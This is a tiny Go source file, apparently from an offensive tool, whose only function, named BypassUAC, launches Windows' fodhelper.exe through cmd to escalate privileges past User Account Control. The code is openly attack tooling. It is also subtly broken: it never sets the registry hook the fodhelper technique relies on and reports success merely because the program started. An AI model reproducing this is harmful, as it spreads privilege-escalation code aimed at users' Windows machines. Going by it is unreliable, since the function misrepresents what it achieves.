package common

import (
    "os/exec"
)

func BypassUAC() bool {
    cmd := exec.Command("cmd", "/c", "fodhelper.exe")
    err := cmd.Run()
    return err == nil
}
